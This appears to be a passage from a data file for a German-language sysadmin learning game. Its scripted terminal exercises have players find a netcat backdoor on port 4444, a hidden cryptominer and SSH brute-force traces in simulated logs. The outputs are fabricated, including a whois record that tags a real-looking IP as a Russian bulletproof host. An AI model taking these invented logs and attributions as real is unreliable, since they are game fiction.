          teachesCommand: 'ping',
          skillGain: { netzwerk: 3 },
        },
        {
          pattern: 'ss -tulpn',
          output: `Netid State  Local Address:Port   Process
tcp   LISTEN 0.0.0.0:22           sshd
tcp   LISTEN 0.0.0.0:80           apache2
tcp   LISTEN 0.0.0.0:443          apache2
tcp   LISTEN 127.0.0.1:3306       mysqld
tcp   LISTEN 0.0.0.0:4444         nc            # <-- VERDÄCHTIG!

# Port 4444?! Das ist ein Netcat-Listener! Eine Backdoor!`,
          teachesCommand: 'ss',
          skillGain: { netzwerk: 4, security: 5 },
          isSolution: true,
        },
        {
          pattern: 'netstat -tulpn',
          output: `Proto Local Address   State       PID/Program name
tcp   0.0.0.0:22      LISTEN      234/sshd
tcp   0.0.0.0:80      LISTEN      567/apache2
tcp   0.0.0.0:443     LISTEN      567/apache2
tcp   127.0.0.1:3306  LISTEN      890/mysqld
tcp   0.0.0.0:4444    LISTEN      9999/nc         # <-- BACKDOOR!

# netstat ist älter, aber funktioniert auch. Port 4444 ist verdächtig!`,
          skillGain: { netzwerk: 3 },
          isSolution: true,
        },
        {
          pattern: 'nslookup warm-srv-01.local',
          output: `Server:		192.168.1.1
Address:	192.168.1.1#53

Name:	warm-srv-01.local
Address: 192.168.1.100

# DNS funktioniert korrekt.`,
          skillGain: { netzwerk: 2 },
        },
        {
          pattern: 'lsof -i :4444',
          output: `COMMAND  PID    USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
nc      9999 malware    3u  IPv4  12345      0t0  TCP *:4444 (LISTEN)

# Der Backdoor-Account "malware" hat den Listener gestartet!`,
          skillGain: { netzwerk: 3, security: 3 },
        },
      ],
      solutions: [
        {
          commands: ['ss', '4444'],
          allRequired: false,
          resultText: 'Backdoor-Port 4444 identifiziert! Der Angreifer hat eine Hintertür.',
          skillGain: { netzwerk: 6, security: 5, troubleshooting: 3 },
          effects: { stress: -5 },
        },
      ],
      hints: [
        '🤖 Jens: "ip addr zeigt deine Netzwerk-Konfiguration."',
        '🤖 Jens: "ping testet ob ein Ziel erreichbar ist. -c 3 für nur 3 Pakete."',
        '🤖 Jens: "ss -tulpn zeigt ALLE offenen Ports. Such nach Ungewöhnlichem."',
        '🤖 Jens: "Port 4444 ist ein Klassiker für Backdoors. Metasploit-Default..."',
      ],
    },
    tags: ['learning', 'terminal', 'linux', 'level4', 'network', 'story'],
  },

  // ============================================
  // ACT 4: THE CONFRONTATION (BOSS BATTLES)
  // ============================================

  {
    id: 'learn_09_windows_realm',
    weekRange: [1, 12],
    probability: 1,
    requiredModes: ['learning'],
    requires: { events: ['learn_04_grep_hunter'] },
    category: 'training',
    involvedCharacters: [],
    title: 'Windows-Sicherheit ★: Das Windows-Reich',
    description: `\`\`\`
╔══════════════════════════════════════════════════════════════╗
║  🪟 DIMENSION WECHSEL                                        ║
║                                                              ║
║  Du betrittst das Windows-Reich.                             ║
║  Hier gelten andere Regeln.                                  ║
║  Hier herrscht: PowerShell.                                  ║
╚══════════════════════════════════════════════════════════════╝
\`\`\`

Der Angreifer hat auch Windows-Server kompromittiert.

PowerShell ist mächtiger als cmd. Zeit es zu lernen.

**Deine Aufgabe:**
- \`Get-Service\` — Zeige alle Dienste
- \`Get-Process | Sort-Object CPU -Descending | Select-Object -First 5\`
- Finde verdächtige Prozesse oder gestoppte kritische Dienste`,
    mentorNote: 'PowerShell nutzt Verb-Noun Cmdlets. Get-Service, Get-Process, etc. Piping funktioniert wie in Linux.',
    choices: [
      {
        id: 'start',
        text: 'PowerShell-Konsole öffnen...',
        effects: { skills: { windows: 6 } },
        resultText: `\`\`\`
╔══════════════════════════════════════════════════════════════╗
║  💪 POWERSHELL-KRIEGER                                       ║
║  ████████████████████████████████████████ 100%               ║
║                                                              ║
║  Du beherrschst jetzt beide Welten:                         ║
║  Linux UND Windows.                                          ║
║                                                              ║
║  Die finale Prüfung wartet...                                ║
╚══════════════════════════════════════════════════════════════╝
\`\`\`

Du bist jetzt ein Cross-Platform-Admin!

Aber die größte Herausforderung steht noch bevor:
Der Security-Incident muss aufgeklärt werden.`,
        terminalCommand: true,
      },
    ],
    terminalContext: {
      type: 'windows',
      hostname: 'WIN-DC01',
      username: 'Administrator',
      currentPath: 'C:\\Users\\Administrator',
      commands: [
        {
          pattern: 'Get-Service',
          output: `Status   Name               DisplayName
------   ----               -----------
Running  ADWS               Active Directory Web Services
Running  DNS                DNS-Server
Stopped  BITS               Intelligenter Hintergrund...
Running  Spooler            Druckwarteschlange
Running  W32Time            Windows-Zeitgeber

# BITS ist gestoppt. Manchmal für Updates wichtig.`,
          teachesCommand: 'Get-Service',
          skillGain: { windows: 3 },
        },
        {
          pattern: 'Get-Service | Where-Object {$_.Status -eq "Stopped"}',
          output: `Status   Name               DisplayName
------   ----               -----------
Stopped  BITS               Intelligenter Hintergrund...
Stopped  SensorService      Sensordienst

# Zwei gestoppte Dienste. BITS könnte problematisch sein.`,
          skillGain: { windows: 4 },
        },
        {
          pattern: 'Get-Process',
          output: `Handles  NPM(K)  PM(K)   WS(K)   CPU(s)    Id  ProcessName
-------  ------  -----   -----   ------    --  -----------
    234      15  12345   23456     1.23  1234  explorer
    567      25  34567   45678     5.67  2345  svchost
    890      35  56789   67890    10.00  3456  powershell
    123      10  99999   88888    95.00  6666  cryptohelper

# PID 6666 "cryptohelper" mit 95% CPU? Das riecht nach Miner!`,
          teachesCommand: 'Get-Process',
          skillGain: { windows: 3 },
        },
        {
          pattern: 'Get-Process | Sort-Object CPU -Descending | Select-Object -First 5',
          output: `Handles  NPM(K)  PM(K)   WS(K)   CPU(s)    Id  ProcessName
-------  ------  -----   -----   ------    --  -----------
    123      10  99999   88888    95.00  6666  cryptohelper
    890      35  56789   67890    10.00  3456  powershell
    567      25  34567   45678     5.67  2345  svchost
    234      15  12345   23456     1.23  1234  explorer
    111       5   5000    3000     0.50  1111  csrss

# Top 5 nach CPU sortiert. "cryptohelper" ist der Schuldige!`,
          skillGain: { windows: 5 },
          isSolution: true,
        },
        {
          pattern: 'Stop-Process -Id 6666 -Force',
          output: `# Prozess 6666 beendet.

[SYSTEM] cryptohelper.exe terminated.
[SYSTEM] CPU-Last fällt auf normale Werte.`,
          skillGain: { windows: 3 },
        },
        {
          pattern: 'Get-EventLog -LogName Security -Newest 5',
          output: `Index Time          Type    Source          Message
----- ----          ----    ------          -------
 1001 Mar 15 02:47  Audit   Security        Logon: malware_admin
 1000 Mar 15 02:47  Audit   Security        Special privileges assigned
  999 Mar 15 02:46  Audit   Security        Account logon attempt

# Um 02:47 hat sich "malware_admin" eingeloggt!`,
          skillGain: { windows: 4, security: 3 },
        },
      ],
      solutions: [
        {
          commands: ['Get-Service', 'Get-Process'],
          allRequired: true,
          resultText: 'Windows-Administration gemeistert! Du findest dich in beiden Welten zurecht.',
          skillGain: { windows: 6, troubleshooting: 4 },
          effects: { stress: -5 },
        },
      ],
      hints: [
        '🤖 Jens: "PowerShell nutzt Verb-Noun. Get-Service holt Dienste."',
        '🤖 Jens: "Get-Process zeigt Prozesse. Wie ps aux in Linux."',
        '🤖 Jens: "Sortieren? | Sort-Object Property -Descending"',
        '🤖 Jens: "Top 5 Ergebnisse? | Select-Object -First 5"',
      ],
    },
    tags: ['learning', 'terminal', 'windows', 'powershell', 'level5', 'story'],
  },

  {
    id: 'learn_10_incident_boss',
    weekRange: [1, 12],
    probability: 1,
    requiredModes: ['learning'],
    requires: { events: ['learn_04_grep_hunter'] },
    category: 'training',
    involvedCharacters: [],
    title: 'Incident Response 1: Erstreaktion',
    description: `\`\`\`
╔══════════════════════════════════════════════════════════════════════════╗
║  ⚔️  BOSS BATTLE: INCIDENT RESPONSE                                      ║
║                                                                          ║
║  ██████████████████████████████████████████████████████████████████████  ║
║  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░  ║
║                                                                          ║
║  STATUS: KRITISCH                                                        ║
║  ZEIT:   5:00 Minuten bis Datenbank-Wipe                                 ║
║                                                                          ║
║  Der Angreifer hat einen Countdown gestartet.                            ║
║  Finde die Quell-IP bevor die Datenbank gelöscht wird!                   ║
╚══════════════════════════════════════════════════════════════════════════╝
\`\`\`

**FINAL BOSS**: Ein Ransomware-Timer läuft!

Die IP des Angreifers ist irgendwo in den Logs versteckt.
Aber nicht in auth.log — das wäre zu einfach.

**PLOT TWIST**: Check auch access.log und syslog!

**Deine Aufgabe:**
- Durchsuche ALLE Logs nach der Angreifer-IP
- Zähle die Angriffsversuche
- Identifiziere den Ursprung (whois)`,
    mentorNote: 'Bei Incidents: Ruhe bewahren, systematisch vorgehen, dokumentieren, dann handeln.',
    choices: [
      {
        id: 'start',
        text: 'Den Angreifer aufspüren...',
        effects: { skills: { security: 8, troubleshooting: 5 } },
        resultText: `\`\`\`
╔══════════════════════════════════════════════════════════════════════════╗
║  🏆 BOSS BESIEGT                                                         ║
║  ██████████████████████████████████████████████████████████████████████  ║
║                                                                          ║
║  ANGREIFER IDENTIFIZIERT:                                                ║
║  IP: 185.234.72.15                                                       ║
║  Herkunft: RU-BULLETPROOF (Russland)                                     ║
║  Versuche: 47 fehlgeschlagene Logins                                     ║
║  Methode: SSH Brute-Force → Key-Based Access                             ║
║                                                                          ║
║  COUNTDOWN GESTOPPT.                                                     ║
║  DATENBANK GERETTET.                                                     ║
╚══════════════════════════════════════════════════════════════════════════╝
\`\`\`

Du hast den Angreifer identifiziert und den Countdown gestoppt!

185.234.72.15 — Russischer Bulletproof-Hoster.
47 Login-Versuche, dann erfolgreicher Key-Zugang.

Jemand hatte den SSH-Key. Ein Insider?

Eine finale Prüfung wartet noch auf dich...`,
        terminalCommand: true,
      },
    ],
    terminalContext: {
      type: 'linux',
      hostname: 'sec-server',
      username: 'analyst',
      currentPath: '/var/log',
      commands: [
        {
          pattern: 'ls',
          output: `access.log  auth.log  error.log  syslog

# Mehrere Logs. Der Angreifer könnte überall Spuren hinterlassen haben.`,
        },
        {
          pattern: 'grep "Failed" auth.log',
          output: `Mar 15 02:40:01 server sshd: Failed password for root from 185.234.72.15
Mar 15 02:40:03 server sshd: Failed password for root from 185.234.72.15
Mar 15 02:40:05 server sshd: Failed password for root from 185.234.72.15
[... 44 weitere Zeilen ...]

# 47 fehlgeschlagene Login-Versuche von derselben IP!`,
          skillGain: { security: 3, linux: 2 },
        },
        {
          pattern: 'grep -c "Failed" auth.log',
          output: `47

# 47 Brute-Force-Versuche!`,
          skillGain: { security: 2 },
        },
        {
          pattern: 'grep "185.234" /var/log/*.log',
          output: `/var/log/auth.log:Mar 15 02:40:01 sshd: Failed password from 185.234.72.15
/var/log/auth.log:Mar 15 02:47:10 sshd: Accepted publickey from 185.234.72.15
/var/log/access.log:185.234.72.15 - - [15/Mar/2026:02:48:00] "GET /admin HTTP/1.1" 200
/var/log/access.log:185.234.72.15 - - [15/Mar/2026:02:48:05] "POST /admin/delete HTTP/1.1" 200
/var/log/syslog:Mar 15 02:47:13 kernel: Connection from 185.234.72.15

# AHA! Die IP ist in ALLEN Logs! Sie haben auch die Web-Admin-Seite besucht!`,
          skillGain: { security: 5, linux: 3 },
          isSolution: true,
        },
        {
          pattern: "grep 'Failed' auth.log | awk '{print $11}' | sort | uniq -c | sort -rn",
          output: `     47 185.234.72.15
      3 192.168.1.50

# 47 Versuche von der Angreifer-IP, 3 von intern (vermutlich vergessenes Passwort)`,
          skillGain: { security: 4, linux: 4 },
        },
        {
          pattern: 'whois 185.234.72.15',
          output: `% RIPE Database Query

netname:        RU-BULLETPROOF
descr:          Bulletproof Hosting Services
country:        RU
remarks:        * Known for hosting malicious actors *
abuse-mailbox:  /dev/null

# Russischer Bulletproof-Hoster. Die ignorieren Abuse-Meldungen.`,
          skillGain: { security: 4 },
          isSolution: true,
        },
        {
          pattern: 'grep "Accepted" auth.log',
          output: `Mar 15 02:47:10 server sshd: Accepted publickey for root from 185.234.72.15

# Sie hatten einen SSH-Key für root! Das war ein Insider-Job!`,
          skillGain: { security: 4 },
        },
      ],
      solutions: [
        {
          commands: ['grep', 'whois', '185'],
          allRequired: false,
          resultText: 'Incident vollständig aufgeklärt! Angreifer-IP identifiziert und dokumentiert.',
          skillGain: { security: 10, troubleshooting: 8, linux: 5 },
          effects: { stress: -15 },
        },
      ],
      hints: [
        '🤖 Jens: "Such nicht nur in auth.log. Der Angreifer hat auch andere Spuren."',
        '🤖 Jens: "grep MUSTER /var/log/*.log durchsucht ALLE Logs auf einmal."',
        '🤖 Jens: "Gefunden? whois IP verrät dir woher der Angriff kam."',
        '🤖 Jens: "Zähl die Versuche mit grep -c. Das brauchst du für den Report."',
      ],
    },
    tags: ['learning', 'terminal', 'linux', 'security', 'level6', 'boss', 'story'],
  },

  {
    id: 'learn_11_final_boss',
    weekRange: [1, 12],
    probability: 1,
    requiredModes: ['learning'],
    requires: { events: ['learn_04_grep_hunter'] },
    category: 'training',
    involvedCharacters: [],
    title: 'Finale: Root Awakening',
    description: `\`\`\`
╔══════════════════════════════════════════════════════════════════════════╗
║  ⚔️⚔️⚔️  FINAL BOSS: ROOT AWAKENING  ⚔️⚔️⚔️                               ║
║                                                                          ║
║     ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄    ║
║     █ PRODUCTION SERVER - CRITICAL FAILURE                         █    ║
║     █ CPU: 100% | RAM: 100% | DISK I/O: BLOCKED                    █    ║
║     █ WEBSERVER: DOWN | DATABASE: UNRESPONSIVE                     █    ║
║     ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀    ║
║                                                                          ║
║  ALLES WAS DU GELERNT HAST - JETZT ANWENDEN.                            ║
║                                                                          ║
║  1. Finde den Prozess der die CPU frisst                                 ║
║  2. Töte ihn                                                             ║
║  3. Starte den Webserver neu                                             ║
║  4. Verifiziere dass alles läuft                                         ║
╚══════════════════════════════════════════════════════════════════════════╝
\`\`\`

**DER PRODUKTIONSSERVER BRENNT!**

Kunden können nicht zugreifen. Das Management ruft an. Du bist der Einzige der es richten kann.

Nutze ALLES was du gelernt hast:
- ps / top / grep für Prozesse
- kill zum Beenden
- systemctl für Dienste
- tail für Log-Analyse

**Deine finale Prüfung beginnt JETZT.**`,
    mentorNote: 'Das ist eine realistische Prod-Incident-Situation. Ruhe bewahren, systematisch vorgehen, dokumentieren.',
    choices: [
      {
        id: 'start',
        text: 'Den Server retten!',
        effects: { skills: { troubleshooting: 10, linux: 5, security: 5 } },
        resultText: `\`\`\`
╔══════════════════════════════════════════════════════════════════════════╗
║                                                                          ║
║  ██████████████████████████████████████████████████████████████████████  ║
║  ██                                                                  ██  ║
║  ██    🏆🏆🏆  LERNMODUS ABGESCHLOSSEN  🏆🏆🏆                        ██  ║
║  ██                                                                  ██  ║
║  ██████████████████████████████████████████████████████████████████████  ║
║                                                                          ║
║  GELERNTE BEFEHLE:                                                       ║
║  ─────────────────────────────────────────────────────────────────────   ║
║  Linux:    pwd, ls, cd, cat, head, tail, grep, ps, kill, systemctl      ║
║  Netzwerk: ping, ip, ss, nslookup, whois                                ║
║  Windows:  Get-Service, Get-Process, Sort-Object, Select-Object         ║
║                                                                          ║
║  FÄHIGKEITEN FREIGESCHALTET:                                            ║
║  ─────────────────────────────────────────────────────────────────────   ║
║  [✓] Dateisystem-Navigation                                             ║
║  [✓] Log-Analyse & Forensik                                             ║
║  [✓] Prozess-Management                                                 ║
║  [✓] Service-Verwaltung                                                 ║
║  [✓] Netzwerk-Diagnose                                                  ║
║  [✓] Incident Response                                                  ║
║                                                                          ║
║  DU BIST JETZT BEREIT FÜR DEN STANDARD-MODUS.                           ║
║                                                                          ║
╚══════════════════════════════════════════════════════════════════════════╝
\`\`\`

**Du hast es geschafft!**

Der Produktionsserver läuft wieder. Die Kunden sind zufrieden.
Das Management ist beeindruckt.

Und du? Du hast gerade eine verdammt gute Grundlage in CLI-Administration gelegt.

Jens wäre stolz auf dich... er würde es nur nie laut sagen.

*[ENDE DES LERNMODUS]*`,
        terminalCommand: true,
      },
    ],
    terminalContext: {
      type: 'linux',
      hostname: 'prod-server',
      username: 'root',
      currentPath: '~',
      commands: [
        {
          pattern: 'ps aux',
          output: `USER       PID %CPU %MEM COMMAND
root         1  0.0  0.1 /sbin/init
root       234  0.1  0.5 /usr/sbin/sshd
www-data   567  0.0  0.0 (apache2 - ZOMBIE)
mysql      890  5.0  4.0 /usr/sbin/mysqld
malware   6666 95.0 45.0 /tmp/.cryptominer --max-cpu
root      7890  0.0  0.1 ps aux

# PID 6666: Cryptominer mit 95% CPU und 45% RAM!`,
          skillGain: { linux: 2 },
        },
        {
          pattern: 'ps aux | grep -E "95|crypto|miner"',
          output: `malware   6666 95.0 45.0 /tmp/.cryptominer --max-cpu
root      7891  0.0  0.0 grep -E 95|crypto|miner

# Gefunden! Der Cryptominer unter dem malware-User.`,
          skillGain: { linux: 3 },
          isSolution: true,
        },
        {
          pattern: 'top',
          output: `top - 14:30:00 up 12:30, 1 user, load average: 47.00, 45.00, 40.00
Tasks: 150 total, 2 running, 147 sleeping, 1 zombie
%Cpu(s): 95.0 us, 5.0 sy, 0.0 id

  PID USER      %CPU %MEM    TIME+ COMMAND
 6666 malware   95.0 45.0 120:00.00 .cryptominer
  890 mysql      5.0  4.0   5:30.00 mysqld

# Load Average 47?! Der Server erstickt!`,
          skillGain: { linux: 2 },
        },
        {
          pattern: 'kill 6666',
          output: `[SYSTEM] Signal 15 (SIGTERM) gesendet an PID 6666
[SYSTEM] Warte auf Prozess-Beendigung...
[SYSTEM] Prozess 6666 beendet.

# CPU-Last fällt sofort von 95% auf 5%!`,
          skillGain: { linux: 3, troubleshooting: 3 },
          isSolution: true,
        },
        {
          pattern: 'kill -9 6666',
          output: `[SYSTEM] Signal 9 (SIGKILL) gesendet an PID 6666
[SYSTEM] Prozess 6666 SOFORT beendet. Kein Pardon.

# Der Cryptominer ist Geschichte!`,
          skillGain: { linux: 2 },
          isSolution: true,
        },
        {
          pattern: 'systemctl status apache2',
          output: `● apache2.service - The Apache HTTP Server
     Active: failed (Result: exit-code) since Mon 2026-03-15 14:00:00 CET
    Process: 567 ExecStart=/usr/sbin/apachectl start (code=exited, status=1)

Mär 15 14:00:00 prod-server systemd[1]: apache2.service: Failed
Mär 15 14:00:00 prod-server apachectl[567]: AH00558: Could not allocate memory

# Apache ist abgestürzt weil der Miner allen RAM gefressen hat!`,
          skillGain: { linux: 2 },
        },
        {
          pattern: 'systemctl start apache2',
          output: `[SYSTEM] apache2.service: Starting...
[SYSTEM] apache2.service: Started The Apache HTTP Server
[SYSTEM] Listening on :80, :443

# Apache läuft wieder!`,
          skillGain: { linux: 3 },
          isSolution: true,
        },
        {
          pattern: 'systemctl restart apache2',
          output: `[SYSTEM] apache2.service: Restarting...
[SYSTEM] apache2.service: Started

# Neustart erfolgreich!`,
          skillGain: { linux: 2 },
          isSolution: true,
        },
        {
          pattern: 'tail -5 /var/log/syslog',
          output: `Mar 15 14:30:00 prod-server systemd[1]: Started Apache
Mar 15 14:30:01 prod-server kernel: Memory pressure relieved
Mar 15 14:30:02 prod-server kernel: System load returning to normal

# System erholt sich!`,
          skillGain: { linux: 2, troubleshooting: 2 },
        },
        {
          pattern: 'curl localhost',
          output: `<!DOCTYPE html>
<html>
<head><title>WARM Abfallwirtschaft</title></head>
<body>
<h1>Willkommen bei WARM!</h1>
<p>Die Webseite ist wieder erreichbar.</p>
</body>
</html>

# Die Website funktioniert wieder! Kunden können zugreifen!`,
          skillGain: { linux: 2, troubleshooting: 2 },
        },
        {
          pattern: 'free -h',
          output: `              total        used        free
Mem:          7.8Gi       2.1Gi       5.7Gi
Swap:         2.0Gi       0.0Gi       2.0Gi

# Speicher wieder frei! Vorher war alles voll.`,
          skillGain: { linux: 2 },
        },
      ],
      solutions: [
        {
          commands: ['ps', 'kill', 'systemctl'],
          allRequired: true,
          resultText: 'PRODUKTIONSSERVER GERETTET! Du hast alle Fähigkeiten gemeistert!',
          skillGain: { linux: 10, troubleshooting: 10, security: 5 },
          effects: { stress: -20, relationships: { chef: 15, kollegen: 10 } },
        },
      ],
      hints: [
        '🤖 Jens: "Systematisch vorgehen! Erst ps aux um den Schuldigen zu finden."',
        '🤖 Jens: "95% CPU? Das muss sterben. kill PID ist dein Freund."',
        '🤖 Jens: "Apache down? systemctl start apache2. Du weißt wie es geht."',
        '🤖 Jens: "Verifizieren! curl localhost testet ob die Seite antwortet."',
        '🤖 Jens: "Du hast es fast geschafft. Ich bin... stolz auf dich, Kleiner."',
      ],
    },
    tags: ['learning', 'terminal', 'linux', 'final', 'boss', 'level6', 'story'],
  },
];
